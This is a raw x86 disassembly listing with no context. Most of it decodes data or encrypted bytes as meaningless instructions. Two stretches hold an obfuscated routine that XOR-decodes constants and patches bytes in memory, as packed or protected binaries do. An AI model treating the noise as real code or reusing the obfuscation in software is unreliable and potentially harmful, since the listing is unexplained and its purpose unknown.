  40947a:	cmp    BYTE PTR [esi+0x28],0x73
  40947e:	xchg   esp,eax
  40947f:	jae    0x4094fc
  409481:	inc    ecx
  409482:	sub    dh,ah
  409484:	stc    
  409485:	mov    ebx,0x2fb131e1
  40948a:	jo     0x409457
  40948c:	les    esp,FWORD PTR [esi]
  40948e:	(bad)  
  40948f:	jl     0x409459
  409491:	cmp    BYTE PTR fs:[edi],bh
  409494:	aam    0x8f
  409496:	inc    ebx
  409497:	in     eax,0x31
  409499:	and    al,0xcf
  40949b:	add    ebx,DWORD PTR [ebp-0x17fbec9f]
  4094a1:	pop    esp
  4094a2:	mov    WORD PTR [edx],?
  4094a4:	ss es loop 0x409514
  4094a8:	mov    esi,0xf0890aff
  4094ad:	clc    
  4094ae:	dec    ebx
  4094af:	sbb    bl,BYTE PTR [edx]
  4094b1:	ss icebp 
  4094b3:	nop
  4094b4:	loopne 0x4094c9
  4094b6:	lea    edi,[esi-0x3]
  4094b9:	mov    dl,0x93
  4094bb:	aas    
  4094bc:	cwde   
  4094bd:	dec    ebp
  4094be:	push   ecx
  4094bf:	sbb    BYTE PTR [edx],bl
  4094c1:	pop    esi
  4094c2:	cwde   
  4094c3:	mov    cl,0xe0
  4094c5:	scas   eax,DWORD PTR es:[edi]
  4094c6:	aas    
  4094c7:	jg     0x40953e
  4094c9:	xchg   BYTE PTR [ecx-0xaab415e],al
  4094cf:	or     BYTE PTR [ebp-0x646e7f00],bl
  4094d5:	adc    DWORD PTR [eax-0x6623cad2],eax
  4094db:	dec    esp
  4094dc:	mov    WORD PTR [edx],ss
  4094de:	shl    ebx,1
  4094e0:	leave  
  4094e1:	(bad)  
  4094e2:	movhps xmm4,QWORD PTR [edx+eiz*2]
  4094e6:	push   esp
  4094e7:	mov    eax,ds:0x6965ec0b
  4094ec:	lods   eax,DWORD PTR ds:[esi]
  4094ed:	mov    ah,0xc9
  4094ef:	in     al,0x29
  4094f1:	aaa    
  4094f2:	pop    esp
  4094f3:	imul   edx,DWORD PTR [edi-0x66cb81d7],0x97a38950
  4094fd:	push   esp
  4094fe:	ss out 0x71,al
  409501:	into   
  409502:	ror    cl,cl
  409504:	mov    fs,WORD PTR [edx-0x574e96c4]
  40950a:	adc    dl,BYTE PTR [ecx]
  40950c:	cdq    
  40950d:	adc    bl,BYTE PTR [ecx-0x7c668e46]
  409513:	repnz pop ecx
  409515:	mov    dh,0xf8
  409517:	je     0x409546
  409519:	adc    esi,eax
  40951b:	adc    al,0x31
  40951d:	ins    BYTE PTR es:[edi],dx
  40951e:	fldenv [edx]
  409520:	cli    
  409521:	sahf   
  409522:	mov    cl,0x2a
  409524:	fwait
  409525:	in     eax,dx
  409526:	lea    edx,[esi-0x6b]
  409529:	mov    ebp,0xd36741bd
  40952e:	jl     0x40955d
  409530:	add    BYTE PTR [ecx],ah
  409532:	or     DWORD PTR [ecx+0x7f],eax
  409535:	sbb    BYTE PTR [eax],0xd3
  409538:	jo     0x40954c
  40953a:	push   0x3a86180
  40953f:	ret    0xe2fc
  409542:	hlt    
  409543:	push   ecx
  409544:	in     al,dx
  409545:	out    0x6,al
  409547:	ss jo  0x4095b9
  40954a:	mov    al,0x12
  40954c:	mov    ds:0xbd3997bb,eax
  409551:	sbb    DWORD PTR [eax+0x57],esp
  409554:	(bad)  
  409555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409556:	xchg   ebx,eax
  409557:	dec    eax
  409558:	cmp    al,cl
  40955a:	scas   al,BYTE PTR es:[edi]
  40955b:	pushf  
  40955c:	pop    ss
  40955d:	adc    esi,edi
  40955f:	je     0x4095d5
  409561:	cwde   
  409562:	push   ebp
  409563:	or     ah,BYTE PTR [edi-0xfc6fc70]
  409569:	push   0x77
  40956b:	pushf  
  40956c:	jp     0x40956c
  40956e:	das    
  40956f:	push   eax
  409570:	mov    WORD PTR [esi],?
  409572:	sahf   
  409573:	(bad)  
  409574:	in     eax,dx
  409575:	jp     0x40951a
  409577:	out    0x42,al
  409579:	in     al,dx
  40957a:	in     al,0xe8
  40957c:	mov    gs,WORD PTR [eax-0x710b1905]
  409582:	sbb    ah,BYTE PTR [edi-0x31617603]
  409588:	pop    ss
  409589:	add    DWORD PTR ds:0x7f29b6a1,ecx
  40958f:	addr16 inc esi
  409591:	das    
  409592:	mov    bl,BYTE PTR [edx-0x291e1e74]
  409598:	or     BYTE PTR [ebx+0x2ede504d],dl
  40959e:	xchg   esi,eax
  40959f:	retf   0x3500
  4095a2:	mov    WORD PTR [edi],gs
  4095a4:	ja     0x4095e1
  4095a6:	les    ebp,FWORD PTR [ebx+0x403f1bd1]
  4095ac:	das    
  4095ad:	retf   
  4095ae:	mov    al,BYTE PTR [esi-0x12]
  4095b1:	retf   
  4095b2:	or     eax,0x7790a56c
  4095b7:	hlt    
  4095b8:	scas   eax,DWORD PTR es:[edi]
  4095b9:	jne    0x40954f
  4095bb:	dec    edx
  4095bc:	pop    edx
  4095bd:	xor    BYTE PTR ds:0xd42d970b,dl
  4095c3:	(bad)  
  4095c4:	mov    eax,ds:0x1fa24fb2
  4095c9:	sub    al,0x6c
  4095cb:	addr16 mov edi,0x1e1aa7b8
  4095d1:	jle    0x4095fb
  4095d3:	cs hlt 
  4095d5:	pop    esi
  4095d6:	retf   0xea01
  4095d9:	sub    edx,DWORD PTR [ebx-0x8eddfc8]
  4095df:	loope  0x40961a
  4095e1:	(bad)
  4095e7:	dec    edx
  4095e8:	sbb    dl,BYTE PTR [ecx]
  4095ea:	cdq    
  4095eb:	xchg   edi,eax
  4095ec:	(bad)  
  4095ed:	shl    BYTE PTR [ebx+0xa],1
  4095f0:	pop    es
  4095f1:	or     al,0x83
  4095f3:	and    DWORD PTR [esi+0x1e],esp
  4095f6:	dec    ebp
  4095f7:	push   ecx
  4095f8:	cmp    esp,DWORD PTR [edi]
  4095fa:	adc    DWORD PTR [esi+0x46],edi
  4095fd:	cmp    cl,bl
  4095ff:	cmp    ch,ch
  409601:	mov    bh,0x85
  409603:	clc    
  409604:	fnstenv [edi]
  409606:	lods   eax,DWORD PTR ds:[esi]
  409607:	inc    ebp
  409608:	fcomp  DWORD PTR [eax+0x248f8312]
  40960e:	out    0x10,al
  409610:	jbe    0x40963a
  409612:	lahf   
  409613:	jle    0x4095dd
  409615:	(bad)  
  409616:	push   ebx
  409617:	and    esp,0x4c
  40961a:	in     eax,0x9
  40961c:	cmp    DWORD PTR [ebx+0x1e813658],ebp
  409622:	push   ebp
  409623:	pushf  
  409624:	mov    edx,0xbaea8ab5
  409629:	and    bl,BYTE PTR [eax-0x1f3ee975]
  40962f:	add    cl,BYTE PTR [ecx+0x568b1055]
  409635:	add    al,0x35
  409637:	jne    0x4095de
  409639:	jns    0x409605
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422568
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0x44bca5c6
  4097de:	sub    dh,0xbe
  4097e1:	inc    edi
  4097e2:	inc    ecx
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    BYTE PTR [eax],dl
  4097ea:	mov    dh,0x77
  4097ec:	clc    
  4097ed:	push   ebp
  4097ee:	mov    ch,dl
  4097f0:	stos   DWORD PTR es:[edi],eax
  4097f1:	je     0x40978d
  4097f3:	into   
  4097f4:	mov    ebp,0xfedf2b6b
  4097f9:	aam    0x48
  4097fb:	lods   eax,DWORD PTR ds:[esi]
  4097fc:	aas    
  4097fd:	mov    ss,edi
  4097ff:	(bad)  
  409800:	sbb    ecx,DWORD PTR [ebp+0x7eb4acfe]
  409806:	mov    ebp,0x9e21fed3
  40980b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40980c:	rol    DWORD PTR [esi],0xe8
  40980f:	bound  eax,QWORD PTR [edx+0x62]
  409812:	ja     0x409838
  409814:	mov    ds:0x7ba041d1,eax
  409819:	pop    edx
  40981a:	pop    ss
  40981b:	or     ah,0xc9
  40981e:	adc    DWORD PTR ds:0xc97a4d96,0xffffffc4
  409825:	xlat   BYTE PTR ds:[ebx]
  409826:	dec    edx
  409827:	ins    BYTE PTR es:[edi],dx
  409828:	fwait
  409829:	adc    BYTE PTR ds:0x502cc1ef,cl
  40982f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409830:	sub    bl,BYTE PTR [esi]
  409832:	je     0x4097ec
  409834:	push   edx
  409835:	xchg   BYTE PTR [ebx],ah
  409837:	mov    bh,0x9
  40983a:	lahf   
  40983b:	pop    eax
  40983c:	sub    DWORD PTR [ecx],0x5d
  40983f:	dec    esi
  409840:	mov    cl,0xc6
  409842:	test   al,0x9e
  409844:	sub    bl,cl
  409846:	cmp    al,0x5a
  409848:	out    dx,eax
  409849:	test   BYTE PTR [edx+0xf25aa51],dh
  40984f:	pusha  
  409850:	pop    ebx
  409851:	mov    esp,0xcfc92887
  409856:	jmp    0x409872
  409858:	retf   0x9978
  40985b:	mov    eax,0xd92f6d14
  409860:	sbb    BYTE PTR [edx],0xdd
  409863:	aad    0xd2
  409865:	dec    ecx
  409866:	add    al,0x74
  409868:	jae    0x4098b0
  40986a:	icebp  
  40986b:	nop
  40986c:	fdiv   st,st(7)
  40986e:	ror    BYTE PTR [edx+0x53cb26ca],0x7b
  409875:	dec    ecx
  409876:	cs lahf 
  409878:	inc    ecx
  409879:	icebp  
  40987a:	popa   
  40987b:	fild   DWORD PTR [ebp+0x132f7fdd]
  409881:	cmc    
  409882:	push   0x81f69035
  409887:	inc    edx
  409888:	sti    
  409889:	arpl   WORD PTR [edi],si
  40988b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40988c:	mov    BYTE PTR [edx+0x45],0x24
  409890:	sbb    DWORD PTR [ebp+0x41d8107a],ebp
  409896:	push   ebp
  409897:	repnz lods eax,DWORD PTR ds:[esi]
  409899:	rcl    BYTE PTR [ecx+eiz*1],cl
  40989c:	outs   dx,DWORD PTR ds:[esi]
  40989d:	adc    ah,cl
  40989f:	out    0x49,eax
  4098a1:	dec    esp
  4098a2:	pop    es
  4098a3:	or     eax,0xfea43010
  4098a8:	jbe    0x40983e
  4098aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098ab:	push   ecx
  4098ac:	retf   0xd6ab
  4098af:	mov    ch,0x62
  4098b1:	jmp    0x409845
  4098b3:	dec    eax
  4098b4:	enter  0x1189,0xd9
  4098b8:	xlat   BYTE PTR ds:[ebx]
  4098b9:	retf   0x5514
  4098bc:	addr16 dec esp
  4098be:	mov    BYTE PTR [edx-0x41],cl
  4098c1:	repz addr16 xor eax,0x1be1de93
  4098c8:	cmp    DWORD PTR [esi-0x49f92bce],ebp
  4098ce:	fstp   st(2)
  4098d0:	jge    0x4098bb
  4098d2:	repz (bad) 
  4098d4:	lock inc BYTE PTR [eax+0x13]
  4098d8:	jle    0x4098ae
  4098da:	sti    
  4098db:	push   esi
  4098dc:	jmp    0x90dcd78f
  4098e1:	fisub  WORD PTR [ebp+0x4d]
  4098e4:	clc    
  4098e5:	and    DWORD PTR [edi],0x74
  4098e8:	cld    
  4098e9:	push   esp
  4098ea:	aaa    
  4098eb:	mov    esp,0x89281be9
  4098f0:	cmp    ecx,edi
  4098f2:	and    BYTE PTR [edx-0x7b],bh
  4098f5:	sbb    eax,0x6eb397f9
  4098fa:	jp     0x409910
  4098fc:	pop    edx
  4098fd:	or     al,0x2b
  4098ff:	outs   dx,DWORD PTR ds:[esi]
  409900:	mov    eax,0x37b91b05
  409905:	ds ins BYTE PTR es:[edi],dx
  409907:	repz jg 0x40991a
  40990a:	pop    es
  40990b:	and    BYTE PTR [ecx-0x7045d718],cl
  409911:	fsub   st(6),st
  409913:	cmp    BYTE PTR [esi],cl
  409915:	in     eax,0xca
  409917:	push   ds
  409918:	xor    ecx,DWORD PTR [edx]
  40991a:	xchg   esi,eax
  40991b:	sti    
  40991c:	stos   DWORD PTR es:[edi],eax
  40991d:	sti    
  40991e:	popf   
  40991f:	xlat   BYTE PTR ds:[ebx]
  409920:	xor    eax,0xeb04a942
  409925:	xchg   ebp,eax
  409926:	scas   eax,DWORD PTR es:[edi]
  409927:	push   es
  409928:	xchg   ebx,eax
  409929:	sub    edx,ebp
  40992b:	data16 sub bl,ch
  40992e:	inc    edx
  40992f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409930:	and    edi,edx
  409932:	out    dx,eax
  409933:	in     al,0x60
  409935:	mov    bl,0xf6
  409937:	scas   al,BYTE PTR es:[edi]
  409938:	jae    0x409901
  40993a:	pusha  
  40993b:	icebp  
  40993c:	push   0xceac6624
  409941:	cmp    DWORD PTR [ebx+0x13],esi
  409944:	not    DWORD PTR [esi]
  409946:	rol    bh,1
  409948:	xor    BYTE PTR [esi-0x75],0xbf
  40994c:	test   al,0xb1
  40994e:	and    eax,0xe914d140
  409953:	rcr    BYTE PTR [ecx+0x29],cl
  409956:	jmp    0x4099a3
  409958:	jmp    0xe7cb:0xbcf46b0d
  40995f:	push   esp
  409960:	clc    
  409961:	jge    0x4098fd
  409963:	xor    DWORD PTR [ecx],0xe0760abf
  409969:	fucomip st,st(4)
  40996b:	jae    0x40996f
  40996d:	sbb    eax,0xbda6ea3e
  409972:	xchg   BYTE PTR [ebx+esi*2-0x71],ah
  409976:	mov    dh,0x6d
  409978:	pop    ecx
  409979:	inc    esi
  40997a:	(bad)  
  40997b:	and    eax,0x5504892
  409980:	or     DWORD PTR [ebx-0x54b89b22],0xffffff8a
  409987:	mov    edi,0xa83c46eb
  40998c:	inc    esp
  40998d:	ss sub al,0xe9
  409990:	imul   edx,DWORD PTR [eax-0x16b2233a],0xef8c54b4
  40999a:	imul   edx
  40999c:	push   edx
  40999d:	pop    es
  40999e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40999f:	je     0x409a00
  4099a1:	scas   eax,DWORD PTR es:[edi]
  4099a2:	mov    ecx,ebx
  4099a4:	mov    ?,WORD PTR [edi-0x4be5f3c]
  4099aa:	xchg   ecx,eax
  4099ab:	(bad)  
  4099ac:	or     bh,ch
  4099ae:	cld    
  4099af:	pop    ss
  4099b0:	gs dec edx
  4099b2:	pop    gs
  4099b4:	jle    0x4099ce
  4099b6:	mov    BYTE PTR [edx+0x6bb6b16c],bl
  4099bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099bd:	xor    ah,BYTE PTR [esi+0x288a772b]
  4099c3:	and    DWORD PTR [ebx-0x6db5c14],esp
  4099c9:	pop    edx
  4099ca:	and    al,0x7d
  4099cc:	fwait
  4099cd:	xor    eax,0xd50618c5
  4099d2:	(bad)  [ebx-0x44]
  4099d5:	pop    edx
  4099d6:	sti    
  4099d7:	nop
  4099d8:	mov    esi,0xff987114
  4099dd:	je     0x4099df
  4099df:	push   edi
  4099e0:	sbb    DWORD PTR [eax],0x9
  4099e3:	je     0x40999e
  4099e5:	call   0x1582b53d
  4099ea:	pop    esp
  4099eb:	cwde   
  4099ec:	ror    dh,0xc5
  4099ef:	stos   DWORD PTR es:[edi],eax
  4099f0:	(bad)  
  4099f1:	daa    
  4099f2:	pop    edx
  4099f3:	pop    ds
  4099f4:	pusha  
  4099f5:	clc    
  4099f6:	adc    eax,0x400604eb
  4099fb:	int3   
  4099fc:	ret    
  4099fd:	fs mov bl,0x10
  409a00:	or     eax,0x4d5f790e
  409a05:	cs int 0xef
  409a08:	dec    esi
  409a09:	jne    0x409a0d
  409a0b:	push   cs
  409a0c:	fild   DWORD PTR [ebx]
  409a0e:	xor    al,0xdd
  409a10:	push   ds
  409a11:	pushf  
  409a12:	rcr    al,0x91
  409a15:	cmp    BYTE PTR ds:0x98d8a79c,bh
  409a1b:	popa   
  409a1c:	out    dx,al
  409a1d:	and    eax,0x33d03026
  409a22:	pop    ebx
  409a23:	dec    esi
  409a24:	push   eax
  409a25:	fisttp WORD PTR [ebp-0x7f]
  409a28:	retf   0xd622
  409a2b:	dec    eax
  409a2c:	sbb    ebx,DWORD PTR [ebp-0x37]
  409a2f:	gs out 0x67,al
  409a32:	popa   
  409a33:	mov    ecx,0xb6324671
  409a38:	inc    edx
  409a39:	inc    ecx
  409a3a:	outs   dx,BYTE PTR ds:[esi]
  409a3b:	xor    dh,dl
  409a3d:	fist   WORD PTR [esi+0x5f]
  409a40:	add    BYTE PTR [ebp-0x109d3643],ah
  409a46:	popa   
  409a47:	dec    esp
  409a48:	mov    eax,0xf6ffc310
  409a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a4e:	(bad)
  409a53:	icebp  
  409a54:	test   DWORD PTR [edx],ebp
  409a56:	push   eax
  409a57:	ret    
  409a58:	stos   DWORD PTR es:[edi],eax
  409a59:	imul   esi,DWORD PTR ds:0xdfdb35cb,0x5e8345a4
  409a63:	hlt    
  409a64:	fisub  DWORD PTR [edx+0x76bfd583]
  409a6a:	and    BYTE PTR [eax-0x30],ch
  409a6d:	bound  ebx,QWORD PTR [edi]
  409a6f:	ds in  eax,dx
  409a71:	jns    0x409abf
  409a73:	aad    0x38
  409a75:	jle    0x409a6a
  409a77:	mov    ds:0xeae25e94,eax
  409a7c:	mov    bl,BYTE PTR es:[ecx-0x10087f24]
  409a83:	pop    ebx
  409a84:	or     dl,dh
  409a86:	ret    
  409a87:	aaa    
  409a88:	add    BYTE PTR [esi],ch
  409a8a:	xchg   DWORD PTR [eax+ebp*1+0x30],ebp
  409a8e:	out    0xe1,ax
  409a91:	adc    DWORD PTR [esi],esp
  409a93:	imul   ebp,DWORD PTR [edx+0x44],0xffffff89
  409a97:	fisub  WORD PTR ds:0x8e86dace
  409a9d:	ins    BYTE PTR es:[edi],dx
  409a9e:	inc    esp
  409a9f:	sbb    edx,DWORD PTR [ebp+0x7a280700]
  409aa5:	cmp    al,0xa0
  409aa7:	lahf   
  409aa8:	mov    bh,0x19
  409aaa:	or     BYTE PTR [eax+0x19],ah
  409aad:	dec    ecx
  409aae:	adc    dh,al
  409ab0:	mov    eax,0xa433b24b
  409ab5:	jp     0x409a8b
  409ab7:	xlat   BYTE PTR ds:[ebx]
  409ab8:	xor    eax,0x8414eca7
  409abd:	mov    WORD PTR [eax],?
  409abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ac0:	sub    dh,BYTE PTR [esi]
  409ac2:	jo     0x409b18
  409ac4:	xchg   esi,eax
  409ac5:	outs   dx,DWORD PTR ds:[esi]
  409ac6:	scas   eax,DWORD PTR es:[edi]
  409ac7:	fcomp  DWORD PTR [edi-0x45]
  409aca:	mov    ebp,0xcf5acca4
  409acf:	xor    BYTE PTR [esp+edx*8-0x56],0x2e
  409ad4:	gs mov ebx,0x4f03df54
  409ada:	outs   dx,DWORD PTR ds:[esi]
  409adb:	jo     0x409b50
  409add:	add    esp,DWORD PTR [esi-0x6a9edf07]
  409ae3:	(bad)  
  409ae5:	jl     0x409ade
  409ae7:	repz pusha 
  409ae9:	inc    ebp
  409aea:	push   esp
  409aeb:	add    eax,0x1f0b8658
  409af0:	add    eax,0x53e60f66
  409af5:	or     dh,BYTE PTR [eax+0x28]
  409af8:	scas   al,BYTE PTR es:[edi]
  409af9:	sub    esi,DWORD PTR [edi-0x55f1f70f]
  409aff:	adc    eax,0x46b21bf1
  409b04:	dec    edx
  409b05:	sub    al,0x87
  409b07:	lods   al,BYTE PTR ds:[esi]
  409b08:	test   al,0x7d
  409b0a:	pop    ebp
  409b0b:	fld    QWORD PTR [edx-0x5a59578d]
  409b11:	stos   DWORD PTR es:[edi],eax
  409b12:	xchg   BYTE PTR [eax+0x1e],ch
  409b15:	cmp    esp,DWORD PTR [ebx]
  409b17:	mov    DWORD PTR [ebx-0x6],ebp
  409b1a:	call   0xac93:0xd3032da7
  409b21:	outs   dx,DWORD PTR ds:[esi]
  409b22:	jmp    0x409b72
  409b24:	inc    edx
  409b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b26:	jge    0x409ae4
  409b28:	iret   
  409b29:	fs inc ebp
  409b2b:	scas   eax,DWORD PTR es:[edi]
  409b2c:	ror    DWORD PTR [ecx-0x70],cl
  409b2f:	nop
  409b30:	aad    0x97
  409b32:	hlt    
  409b33:	call   0x8b391a2b
  409b38:	sub    edx,DWORD PTR [edi]
  409b3a:	jmp    0x407c7892
  409b3f:	dec    ebx
  409b40:	(bad)  
  409b41:	jne    0x409b7c
  409b43:	rcl    DWORD PTR [edi+0x3536c63a],0x6a
  409b4a:	ins    DWORD PTR es:[edi],dx
  409b4b:	or     al,0x3d
  409b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b4e:	sar    BYTE PTR [eax*2-0x4d75c7d4],cl
  409b55:	loopne 0x409afa
  409b57:	inc    esi
  409b58:	mov    al,ds:0x9c154130
  409b5d:	or     eax,0x9d1e777e
  409b62:	not    DWORD PTR ss:[ecx+edi*4]
  409b66:	dec    esp
  409b67:	xchg   ebx,eax
  409b68:	popf   
  409b69:	les    edi,FWORD PTR [edx-0x71]
  409b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b6d:	mov    ah,0x2a
  409b6f:	sbb    eax,0x8cf42e39
  409b74:	daa    
  409b75:	or     esi,DWORD PTR [edx]
  409b77:	leave  
  409b78:	inc    esp
  409b79:	adc    DWORD PTR [edi+0x231b0949],0xb6e75c11
  409b83:	and    al,0xf
  409b85:	scas   al,BYTE PTR es:[edi]
  409b86:	add    DWORD PTR [eax-0x47fdb863],ebx
  409b8c:	jge    0x409ba5
  409b8e:	call   0xc9f3:0x661c1680
  409b95:	fsub   QWORD PTR es:0x541962ca
  409b9c:	outs   dx,BYTE PTR ds:[esi]
  409b9d:	push   ebp
  409b9e:	inc    edi
  409b9f:	fstp   TBYTE PTR [edi-0xe]
  409ba2:	loope  0x409b89
  409ba4:	ins    BYTE PTR es:[edi],dx
  409ba5:	aad    0xda
  409ba7:	inc    eax
  409ba8:	jmp    0x409c29
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
  409bae:	add    eax,DWORD PTR ds:0x422568
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422568
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
